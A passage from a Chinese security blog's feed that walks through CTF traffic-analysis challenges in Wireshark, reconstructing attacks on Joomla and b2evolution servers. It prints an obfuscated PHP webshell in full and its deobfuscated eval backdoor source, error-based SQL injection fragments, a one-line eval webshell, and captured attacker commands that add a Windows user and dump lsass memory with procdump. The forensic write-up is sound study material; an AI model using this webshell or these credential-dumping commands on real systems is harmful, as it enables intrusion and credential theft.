h.editor_user_id\n</span><br></pre></td></tr></table></figure><p>而且还可以从响应里面发现是从<code>joomla.ajtuc_users</code>表里面注入的东西，也知道了前缀为<code>ajtuc</code>，同时也知道了数据库为<code>joomla</code>。第三四题解决</p><p>然后要找登录后台的密码，但是这里直接<code>contains &quot;password&quot;</code>是找不到的，我们这时候就得转换思路就是说黑客是从数据库里把密码爆出来的<br>如果仔细看这个黑客的行为的话，他事先尝试登录发现不行才用的SQL注入，所以也就跟着这个思路来走了</p><p>既然报错注入，里面必含有password的关键字以及表名，立即过滤<br><code>ip.src == 202.1.1.2 and http contains &quot;password&quot; and http contains &quot;joomla.ajtuc_users&quot;</code><br>发现有三条，标记一下查看他们的response<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Status: 500 XPATH syntax error: &apos;qqzvq$2y$10$lXujU7XaUviJDigqqkkq&apos; </span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq&apos; </span><br><span class="line">Status: 500 XPATH syntax error: &apos;qqzvqzi/8B2QRD7qIlDJeqqkkq&apos;</span><br></pre></td></tr></table></figure></p><p>再来查看一下报错注入是这样的，存在拼接<code>0x71717a7671</code>，解码一下<code>qqzvq</code><br><code>UPDATEXML(5928,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,22</code>，所以得把qqzvq前缀去掉</p><p><code>$2y$10$lXujU7XaUviJDigqqkkqFMzKy6.wx7EMCBqpzrJdn7qqkkqzi/8B2QRD7qIlDJeqqkkq</code><br>拼接起来就是经过加密后的密码，官方答案是qwert123，但还是解不出来</p><p>第一个包里面过滤<br><code>http.request.method == &quot;POST&quot; and ip.src == 202.1.1.2</code><br><a href="https://imgchr.com/i/iCEeeA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEeeA.md.png" alt="iCEeeA.md.png"></a></p><p>没发现有可疑数据</p><p>再找第二个包<br><code>ip.src == 202.1.1.2 and http.request.method == &quot;POST&quot; and http contains &quot;eval&quot;</code>，发现存在一个文件<code>kkkaaa.php</code><br><a href="https://imgchr.com/i/iCEMJf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEMJf.md.png" alt="iCEMJf.md.png"></a></p><p>可以发现这里面的是一个马，密码为<code>zzz</code><br>然后我们再根据这个马去寻找上传的的第二个马<br>当我们点到第三个报文的时候发现多了一个参数<code>z2</code>，有点可疑<br><a href="https://imgchr.com/i/iCEQW8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEQW8.md.png" alt="iCEQW8.md.png"></a></p><p>保存出来看一下，发现是段php代码，<br><img src="https://s1.ax1x.com/2018/09/06/iCE3Qg.png" alt="iCE3Qg.png"><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>.$p=<span class="string">'l&gt;]ower";$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5'</span>;.$d=<span class="string">']q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll("/(&gt;][\\w]&gt;])[\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\d]))?,?/",&gt;'</span>;.$W=<span class="string">'),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base'</span>;.$e=<span class="string">']T_LANGUAGE"];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u["&gt;]query"],$&gt;]q);$&gt;'</span>;.$E=<span class="string">'&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt("&lt;$k&gt;$d&lt;&gt;]/$k&gt;"&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;'</span>;.$t=<span class="string">'($i.&gt;]$kf),0,3&gt;]));$p&gt;]="";fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;'</span>;.$M=<span class="string">']$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s="substr";$sl="s&gt;]&gt;]trto'</span>;.$P=<span class="string">']f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]="";$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;'</span>;.$j=str_replace(<span class="string">'fr'</span>,<span class="string">''</span>,<span class="string">'cfrrfreatfrfre_funcfrtfrion'</span>);.$k=<span class="string">'];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]"HTTP&gt;]_REFERE&gt;]R"];$ra&gt;]=@&gt;]$r["&gt;]HTTP_A&gt;]CC&gt;]EP&gt;'</span>;.$g=<span class="string">'"";for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;'</span>;.$R=<span class="string">'$k&gt;]h="cb4&gt;]2";$kf="e130"&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o='</span>;.$Q=<span class="string">']s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;'</span>;.$v=<span class="string">']mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array("/_/","/-/"),arr&gt;]ay(&gt;]"/","+"&gt;]'</span>;.$x=str_replace(<span class="string">'&gt;]'</span>,<span class="string">''</span>,$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);.$N=$j(<span class="string">''</span>,$x);$N();.<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>解混淆<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump($j);</span><br><span class="line">var_dump($x);</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">15</span>) <span class="string">"create_function"</span></span><br><span class="line">string(<span class="number">929</span>) <span class="string">"$kh="</span>cb42<span class="string">";$kf="</span>e130<span class="string">";function x($t,$k)&#123;$c=strlen($k);$l=strlen($t);$o="</span><span class="string">";for($i=0;$i&lt;$l;)&#123;for($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++)&#123;$o.=$t&#123;$i&#125;^$k&#123;$j&#125;;&#125;&#125;return $o;&#125;$r=$_SERVER;$rr=@$r["</span>HTTP_REFERER<span class="string">"];$ra=@$r["</span>HTTP_ACCEPT_LANGUAGE<span class="string">"];if($rr&amp;&amp;$ra)&#123;$u=parse_url($rr);parse_str($u["</span>query<span class="string">"],$q);$q=array_values($q);preg_match_all("</span>/([\w])[\w-]+(?:;q=<span class="number">0.</span>([\d]))?,?/<span class="string">",$ra,$m);if($q&amp;&amp;$m)&#123;@session_start();$s=&amp;$_SESSION;$ss="</span>substr<span class="string">";$sl="</span>strtolower<span class="string">";$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p="</span><span class="string">";for($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0)&#123;$s[$i]="</span><span class="string">";$p=$ss($p,3);&#125;if(array_key_exists($i,$s))&#123;$s[$i].=$p;$e=strpos($s[$i],$f);if($e)&#123;$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("</span>/_/<span class="string">","</span>/-/<span class="string">"),array("</span>/<span class="string">","</span>+<span class="string">"),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print("</span>&lt;$k&gt;$d&lt;/$k&gt;<span class="string">");@session_destroy();&#125;&#125;&#125;&#125;"</span></span><br></pre></td></tr></table></figure></p><p>基本上可以确定这是第二个马<br>上传时间为<br><code>17:20:44.248365</code><br>然后重新过滤一下<br><code>ip.src == 202.1.1.2 and http</code>根据时间上的关系也可以确定第二上传的马的名字为<code>/tmp/footer.php</code></p><p>其实我们也可以从上面发现关于头的操作有两个东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$rr = @$_SERVER[&quot;HTTP_REFERER&quot;];</span><br><span class="line">$ra = @$_SERVER[&quot;HTTP_ACCEPT_LANGUAGE&quot;];</span><br></pre></td></tr></table></figure></p><p>看的跟清楚一点可以追踪几个<code>footer</code>的流看一下<br>明显发现<code>referer</code>有base64加密但是LANGUAGE没啥变化，所以最后的答案应该是referer<br><a href="https://imgchr.com/i/iCENoq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCENoq.md.png" alt="iCENoq.md.png"></a></p><p>然后题目抛出mysql的操作<br>在第四个包里面才找到关于SQL的相关协议<br><a href="https://imgchr.com/i/iCEbTI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEbTI.md.png" alt="iCEbTI.md.png"></a><br><code>mysql and mysql contains &quot;password&quot;</code><br>过滤之后可以发现黑客又在爆破<br>直接找到最后的login请求里面的hash值就是<code>password</code><br><a href="https://imgchr.com/i/iCEdYV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEdYV.md.png" alt="iCEdYV.md.png"></a></p><p>然后再来过滤一波查看黑客究竟<code>footer.php</code>之后的操作，发现有<code>tunnel</code>这样的关键字样，明显第一次使用的代理ip为<code>4.2.2.2</code><br><a href="https://imgchr.com/i/iCEBSU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEBSU.md.png" alt="iCEBSU.md.png"></a></p><p>然后第五到第八个包没有任何有关题目的答案</p><p>过滤第九个包的内容<br><code>(ip.addr == 202.1.1.2) and (http contains &quot;ls&quot;|| http contains &quot;dir&quot;)</code><br>发现有两次列目录的过程<br><a href="https://imgchr.com/i/iCEXff" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEXff.md.png" alt="iCEXff.md.png"></a></p><p>用了<code>dir</code>的那一次才有回显，系统是<code>Windows</code>没错了<br><a href="https://imgchr.com/i/iCEz6g" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCEz6g.md.png" alt="iCEz6g.md.png"></a><br>时间很明显就是这个了<br>我么现在知道黑客攻击的ip是<code>192.168.2.20</code>，然后过滤一下<code>ip.addr == 192.168.2.20 &amp;&amp; http</code><br><a href="https://imgchr.com/i/iCVSXQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVSXQ.md.png" alt="iCVSXQ.md.png"></a><br>发现黑客通过echo命令写入一句话木马，然后通过<code>sh.php</code>执行<br>再过滤一下<br><code>ip.src == 192.168.2.20 &amp;&amp; http</code><br>发现在<code>18:49:27.767754</code>发现了疑似黑客振兴<code>net user localgroup</code> 命令的结果<br><a href="https://imgchr.com/i/iCVC0s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVC0s.md.png" alt="iCVC0s.md.png"></a><br>标记一下在其附近找请求</p><p>果不其然<br>在他的下方的post请求里面的<code>z2</code>参数里面解码得到<br><a href="https://imgchr.com/i/iCVFkq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVFkq.md.png" alt="iCVFkq.md.png"></a></p><p><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E]</code><br>也就是增加了<code>kaka:kaka</code>这个用户名和密码</p><p>最后一个问题是下载了什么文件，由于使用菜刀下载的，很简单直接过滤post请求就好<br><code>ip.dst == 192.168.2.20 &amp;&amp; http.request.method== &quot;POST&quot;</code><br><a href="https://imgchr.com/i/iCVecF" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/09/06/iCVecF.md.png" alt="iCVecF.md.png"></a></p><p>在这个包里面会发现最后有几个报文是含有z2参数的，十分可疑，解码<br>会发现哟一个利用<code>procdump.exe</code>操作的东西<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lspasss.dmp&amp;echo [S]&amp;cd&amp;echo [E]</code><br>下面的post请求解码z2参数也是类似的东西<br><code>cd/d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;procdump.exe -accepteula -ma lsass.exe&amp;echo [S]&amp;cd&amp;echo [E]</code><br>再来解码一下最后一个报文里面的东西，发现这个文件<br><code>C:\phpStudy\WWW\b2evolution\install\test\lsass.exe_180208_185247.dmp</code><br>猜测应该是下了这个文件<br>然后打开第10个报文确认就是这个文件就好了</p><p>答案归纳</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.192.168.1.8</span><br><span class="line">2.list[select]</span><br><span class="line">3.ajtuc</span><br><span class="line">4.joomla</span><br><span class="line">5.$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi/8B2QRD7qIlDJe(未解密)</span><br><span class="line">6.zzz</span><br><span class="line">7.17:20:44.248365</span><br><span class="line">8.Referer</span><br><span class="line">9.admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4</span><br><span class="line">10.4.2.2.2</span><br><span class="line">11.18:49:27.767754</span><br><span class="line">12.kaka:kaka</span><br><span class="line">13.lsass.exe_180208_185247.dmp</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>1.发现有菜刀流量的时候多关注是否出现z2参数的值，凡是出现这种参数的值得多去解码看看，不要嫌麻烦，因为这里面往往包含一些关键操作<br>2.出现一些有关php混淆的代码的时候要学会找到对应的参数去反混淆2333</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;keep learning&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;链接: &lt;a href=&quot;https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pan.baidu.com/s/1b6bkW-J8vKASr8C2r9vsdQ&lt;/a&gt; 密码: nux4&lt;br&gt;感谢方方土学长的&lt;a href=&quot;http://skysec.top/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;题解&lt;/a&gt;，学习到
    
    </summary>
    
      <category term="流量分析" scheme="0verwatch.top/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
      <category term="流量分析" scheme="0verwatch.top/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>安恒8月应急响应题目回顾</title>
    <link href="0verwatch.top/2018/08/30/anheng-8month-part1/"/>
    <id>0verwatch.top/2018/08/30/anheng-8month-part1/</id>
    <published>2018-08-30T14:22:35.000Z</published>
    <updated>2018-08-30T14:25:46.544Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最做流量分析的题目感觉还是不太熟悉，所以最近几篇博客都应该都是练习流量分析的题目了，就从安恒8月赛这个应急响应讲起吧，记录一下加深印象，顺便小结一下自己的做题领悟。<a id="more"></a></p><p>题目地址  <a href="https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg" target="_blank" rel="noopener">https://pan.baidu.com/s/13SoD6xB7YBiqpUDCIcb8mg</a></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1、给出黑客使用的扫描器</span><br><span class="line">2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php</span><br><span class="line">3、得到黑客使用了什么账号密码登陆了web后台(形式:username/password)</span><br><span class="line">4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码</span><br><span class="line">5、黑客在robots.txt中找到的flag是什么</span><br><span class="line">6、黑客找到的数据库密码是多少</span><br><span class="line">7、黑客在数据库中找到的hash_code是什么</span><br><span class="line">8、黑客破解了账号ijnu@test.com得到的密码是什么</span><br><span class="line">9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</span><br><span class="line">10、黑客使用了什么账号登陆了mail系统（形式: username/password）</span><br><span class="line">11、黑客获得的vpn,ip是多少</span><br></pre></td></tr></table></figure><p>还得了解一下一些前置的知识</p><p>过滤IP，如源IP或者目标 x.x.x.x<br><code>ip.src == x.x.x.x or ip.dst eq x.x.x.x 或者 ip.addr == x.x.x.x</code><br>过滤端口<br><code>tcp.port eq 80 or udp.port eq 80</code><br>过滤MAC<br><code>eth.dst ==A0:00:00:04:C5:84</code></p><p>http模式过滤(就是一种模糊匹配)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http.request.method== &quot;GET&quot; </span><br><span class="line">http.request.method== &quot;POST&quot; </span><br><span class="line">http.request.uri ==&quot;/img/logo-edu.gif&quot; </span><br><span class="line">http contains&quot;GET&quot; </span><br><span class="line">http contains&quot;HTTP/1.&quot; </span><br><span class="line">http.request.method== &quot;GET&quot; &amp;&amp; http contains &quot;User-Agent:&quot;</span><br></pre></td></tr></table></figure><p>一些常见的自动化工具的指纹</p><p>Awvs（Acunetix Web Vulnerability Scanner ）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">acunetix_wvs_security_test acunetix </span><br><span class="line">acunetix_wvs acunetix_test</span><br><span class="line">Acunetix-Aspect-Password: Cookie: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-Host: </span><br><span class="line">acunetix_wvs_security_test X-Forwarded-For: </span><br><span class="line">acunetix_wvs_security_test Host: </span><br><span class="line">acunetix_wvs_security_test</span><br></pre></td></tr></table></figure><p>感觉我们只需要http contains “wvs” 或者是 http contains “acunetix”就可以把包给筛选出来</p><p>Netsparker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Scanner: NetsparkerLocation: </span><br><span class="line">NetsparkerAccept: netsparker/checkCookie: </span><br><span class="line">netsparkerCookie: NETSPARKER</span><br></pre></td></tr></table></figure><p>Appscan</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Headers Content-Type: Appscan </span><br><span class="line">Content-Type: AppScanHeaderAccept: Appscan User-Agent:Appscan</span><br></pre></td></tr></table></figure><p>Nessus</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">x_forwarded_for: nessus</span><br><span class="line">referer: nessus</span><br><span class="line">host: nessus</span><br></pre></td></tr></table></figure><p>Sqlmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: sqlmap1.2.8#stable</span><br></pre></td></tr></table></figure><h4 id="1、给出黑客使用的扫描器"><a href="#1、给出黑客使用的扫描器" class="headerlink" title="1、给出黑客使用的扫描器"></a>1、给出黑客使用的扫描器</h4><p>竟然是黑客攻击，就应该把把http过滤看一下或者直接搜就行<br><a href="https://imgchr.com/i/Pj0s39" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0s39.md.png" alt="Pj0s39.md.png"></a><br>所以这一题的答案是awvs</p><h4 id="2、得到黑客扫描到的登陆后台是-相对路径即可-admin-login-php"><a href="#2、得到黑客扫描到的登陆后台是-相对路径即可-admin-login-php" class="headerlink" title="2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php"></a>2、得到黑客扫描到的登陆后台是(相对路径即可) /admin/login.php</h4><p>通常后台的名字包括</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">manager</span><br><span class="line">login</span><br><span class="line">system</span><br></pre></td></tr></table></figure><p>所以我们直接搜其中的一个输入命令<code>http contains &quot;login&quot; &amp;&amp; http.request.method == &quot;POST&quot;</code><br><a href="https://imgchr.com/i/Pj0ycR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0ycR.md.png" alt="Pj0ycR.md.png"></a><br>前面的都是登陆的页面，那个password_reset应该是密码重置<br>所以这一题的答案应该是<code>/admin/login.php?rec=login</code></p><p>###3、得到黑客使用了什么账号密码登陆了web后台(形式:username/password)<br>也是同样的套路<br>输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;password&quot;</span><br></pre></td></tr></table></figure></p><p> 这个我找得有点久，因为答案在最后，中间还有其他可以登陆上去的用户有一个还像是人事，还有两外一个好像是设么simple啥的，看了这整个包，发现simple这个账号有好几次改密码的操作，人事也登陆了几次，这些混淆都给这题提高难度，如果你真的仔细分析这个包的话就会发现，这里面黑客是大概爆破了几次，中间还尝试了一波SQL注入，而且爆破的过程都是用的admin账户，这也暗示了为什么最后的登陆的用户名是admin了，这里的话登陆成功可以看长度，对比爆破跟正常人事的登录，成功的话一般长度都是750+，没成功的话一般都是730+<br><a href="https://imgchr.com/i/Pj06j1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj06j1.md.png" alt="Pj06j1.md.png"></a><br>所以第三题的答案是<code>admin/admin!@#pass123</code></p><h4 id="4、得到黑客上传的webshell文件名是什么，内容是什么-提交webshell内容的base编码"><a href="#4、得到黑客上传的webshell文件名是什么，内容是什么-提交webshell内容的base编码" class="headerlink" title="4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码"></a>4、得到黑客上传的webshell文件名是什么，内容是什么,提交webshell内容的base编码</h4><p>通常webshell都会有明显的关键字比如eval、assert之类的，还有各种回调函数就不多说了。<br>我们这里也是一样的套路<br><code>ip.src == 192.168.94.59 and http contains &quot;eval&quot;</code> 一看这不太正常的文件名，有很大机会就是webshell了，而且里面的内容含有z1这样的参数很大可能性就是菜刀连接的流量，所以文件名是<code>/image/article/a.php</code><br><a href="https://imgchr.com/i/Pj02B6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj02B6.md.png" alt="Pj02B6.md.png"></a></p><p>所以这题的答案是<br><code>&lt;?php @eval([1234]);?&gt;</code>的base64编码</p><h4 id="5、黑客在robots-txt中找到的flag是什么"><a href="#5、黑客在robots-txt中找到的flag是什么" class="headerlink" title="5、黑客在robots.txt中找到的flag是什么"></a>5、黑客在robots.txt中找到的flag是什么</h4><p>正常操作<code>http contains &quot;robots.txt&quot;</code>然后追踪流就好了<br><a href="https://imgchr.com/i/Pj0I9H" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0I9H.md.png" alt="Pj0I9H.md.png"></a><br>这题的答案就是上图的flag</p><h4 id="6、黑客找到的数据库密码是多少"><a href="#6、黑客找到的数据库密码是多少" class="headerlink" title="6、黑客找到的数据库密码是多少"></a>6、黑客找到的数据库密码是多少</h4><p>对于这题的数据库操作，先把马给过滤出来，然后再从里面找他的response，因为这里黑客是通过马对数据库操作的<br>可以先标记一下<code>a.php</code>第一次出现的地方，然后过滤http一条条去看他们的response就可以了，要是想详细一点的话可以加上db等字样，这就是做题时候的一些小技巧了。。可能恰好一样的效率有点低<br><a href="https://imgchr.com/i/Pj0XE8" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/Pj0XE8.md.png" alt="Pj0XE8.md.png"></a><br>所以这题的答案就是<code>e667jUPvJjXHvEUv</code></p><h4 id="7、黑客在数据库中找到的hash-code是什么"><a href="#7、黑客在数据库中找到的hash-code是什么" class="headerlink" title="7、黑客在数据库中找到的hash_code是什么"></a>7、黑客在数据库中找到的hash_code是什么</h4><p>这个题目明显的就是说在数据库里面找到的hash_code，但是在第一个包里面使用<code>http contains &quot;hsah_code&quot;</code>只找到一个响应报文，里面什么都找不到，这时候我们别忘了有第二个包的存在，我就是经常忘了。。这种做题习惯得改改，太浮躁，一旦发现没有就不做了。。。<br>我们来对比一下两个包的协议分级，很明显第二包里面大多数都是mysql的操作，所以很大可能性就是这个包里面存在我们要的答案<br>第一个包应用层大部分都是html的响应<br><a href="https://imgchr.com/i/PjBpgs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBpgs.md.png" alt="PjBpgs.md.png"></a><br>而第二个包明显了，直接在tcp协议上执行的Mysql操作<br><a href="https://imgchr.com/i/PjB9vn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjB9vn.md.png" alt="PjB9vn.md.png"></a><br>我们可以在第二个包里面用mysql的过滤，如果是想搜索执行语句的话最好这样子，如：mysql.query contains “SELECT”<br>类似的模糊匹配<br><code>mysql contains &quot;hash_code&quot;</code><br>然后随便找个response追踪流看一下，发现答案<br><a href="https://imgchr.com/i/PjBiD0" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBiD0.md.png" alt="PjBiD0.md.png"></a><br>这题答案是<code>d1c029893df40cb0f47bcf8f1c3c17ac</code></p><h4 id="8、黑客破解了账号ijnu-test-com得到的密码是什么"><a href="#8、黑客破解了账号ijnu-test-com得到的密码是什么" class="headerlink" title="8、黑客破解了账号ijnu@test.com得到的密码是什么"></a>8、黑客破解了账号<a href="mailto:ijnu@test.com" target="_blank" rel="noopener">ijnu@test.com</a>得到的密码是什么</h4><p>这一题一开始我还以为答案在mail的那两个包里面，结果还是在对sql操作的那个包上面，上来就直接<code>http contains &quot;ijnu@test.com&quot;</code>啥都没发现，这题目感觉出题没说得太明白。。<br>后面就用<code>tcp contains &quot;ijnu@test.com&quot;</code>把包筛出来，并且追踪流就行了，当然这题也可以用<code>mysql contains &quot;ijnu@test.com&quot;</code> 把包筛出来<br>一样的效果<br><a href="https://imgchr.com/i/PjBV5F" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBV5F.md.png" alt="PjBV5F.md.png"></a><br>这题明显密码经过MD5加密的，所以这题得去somd5上解密<br>这题的答案是<code>edc123!@#</code></p><h4 id="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip"><a href="#9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip" class="headerlink" title="9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip"></a>9、被黑客攻击的web服务器，网卡配置是是什么，提交网卡内网ip</h4><p>在webone的那个包里面直接搜索就可以得到<br><code>http contains &quot;eth&quot;</code><br><a href="https://imgchr.com/i/PjBm8J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/30/PjBm8J.md.png" alt="PjBm8J.md.png"></a><br>或者你也可以直接从webtwo的包里面直接看到内网ip，这也对应了题目后面内网渗透之后，用vpn连接的过程<br>也就是从<code>192.168.32.189(内网地址)-&gt;10.3.3.100(连接vpn后重新分配的内网地址)</code><br>所以这题的答案就是<code>10.3.3.100</code></p><h4 